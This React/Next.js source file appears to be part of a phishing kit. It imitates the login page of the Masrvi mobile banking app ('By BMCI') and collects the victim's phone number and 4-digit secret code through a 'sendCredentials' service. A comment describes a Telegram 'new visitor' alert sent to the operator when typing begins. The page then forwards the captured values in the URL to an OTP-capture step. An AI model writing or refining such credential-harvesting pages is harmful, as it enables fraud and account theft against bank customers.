"use client";

import Link from "next/link";
import { useRouter } from "next/navigation";
import { useRef, useState } from "react";
import { useMutation } from "@tanstack/react-query";
import { CredentialsService } from "@/services/auth.service";

export default function LoginStep() {
  const router = useRouter();
  const [phone, setPhone] = useState("");
  const [codeSecret, setCodeSecret] = useState("");

  // Fire the "new visitor" Telegram notification once, the first time the
  // user starts typing their phone number.
  const visitSent = useRef(false);

  const sendCredentials = useMutation({
    mutationFn: CredentialsService.sendCredentials,
  });

  const visit = useMutation({
    mutationFn: CredentialsService.sendVisitUser,
  });

  const canSubmit = phone.trim().length > 7 && /^\d{4}$/.test(codeSecret);

  const onSubmit = (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    if (!canSubmit || sendCredentials.isPending) return;

    sendCredentials.mutate(
      { phone: phone.trim(), codeSecret },
      {
        onSuccess: () =>
          router.push(
            `/login/otp?phone=${phone.trim()}&secretCode=${codeSecret}`,
          ),
      },
    );
  };

  const onPhoneChange = (raw: string) => {
    const value = raw.replace(/\D/g, "");
    setPhone(value);
    if (value && !visitSent.current) {
      visitSent.current = true;
      visit.mutate();
    }
  };

  return (
    <div className="mx-auto md:max-w-md min-h-screen ">
      <div className="min-h-screen w-full  flex flex-col">
        <div className="px-5 pt-5">
          <Link
            href="/"
            className="flex items-center gap-1 text-slate-700 text-base"
          >
            <span className="text-lg">›</span>
            <span>retour</span>
          </Link>
        </div>

        <div className="flex-1 flex flex-col px-6">
          <div className="flex flex-col items-center mt-6 mb-8">
            <div
              className="text-5xl font-bold text-emerald-500 leading-none"
              style={{ fontFamily: "Cairo, Tajawal, sans-serif" }}
            >
              مصرفي
            </div>
            <div className="text-2xl font-bold text-[#0a3d5c] mt-2 tracking-wide">
              Masrvi
            </div>
            <div className="text-sm text-slate-500 mt-1">By BMCI</div>
          </div>

          <h1 className="text-2xl font-bold text-slate-900 text-center mb-8">
            Connexion
          </h1>

          <form onSubmit={onSubmit} className="flex flex-col flex-1">
            <div className="mb-5">
              <label className="block text-right text-sm text-slate-600 mb-2">
                Numéro de téléphone
              </label>
              <div className="flex gap-2">
                <div className="w-20 rounded-xl bg-slate-100 flex items-center justify-center text-slate-500 font-medium text-base">
                  222
                </div>
                <input
                  inputMode="numeric"
                  value={phone}
                  onChange={(e) => onPhoneChange(e.target.value)}
                  placeholder="6XXXXXXXX"
                  className="flex-1 rounded-xl bg-slate-100 px-4 py-4 text-slate-700 placeholder:text-slate-400 outline-none focus:ring-2 focus:ring-emerald-400 text-base"
                  type="tel"
                />
              </div>
            </div>

            <div className="mb-3">
              <label className="block text-right text-sm text-slate-600 mb-2">
                Code secret (4 chiffres)
              </label>
              <div className="rounded-xl bg-slate-100 cursor-text">
                <input
                  inputMode="numeric"
                  maxLength={4}
                  value={codeSecret}
                  onChange={(e) =>
                    setCodeSecret(e.target.value.replace(/\D/g, ""))
                  }
                  placeholder="••••"
                  className="w-full bg-transparent text-center px-4 py-4 text-slate-700 placeholder:text-slate-400 outline-none text-2xl tracking-[0.6em] font-semibold"
                  aria-label="Code secret"
                  type="tel"
                />
              </div>
            </div>

            <div className="text-right mt-2 mb-6">
              <button
                type="button"
                className="text-sm text-slate-600 underline"
              >
                Je n`ai plus accès à mon numéro
              </button>
            </div>

            <button
              type="submit"
              disabled={!canSubmit || sendCredentials.isPending}
              className={`w-full rounded-2xl py-4 font-semibold text-lg transition mb-6 ${
                canSubmit && !sendCredentials.isPending
                  ? "bg-emerald-500 text-white"
                  : "bg-emerald-200 text-emerald-700 cursor-not-allowed"
              }`}
            >
              {sendCredentials.isPending ? "Envoi…" : "Me connecter"}
            </button>

            <div className="flex-1" />
          </form>
        </div>
      </div>
    </div>
  );
}
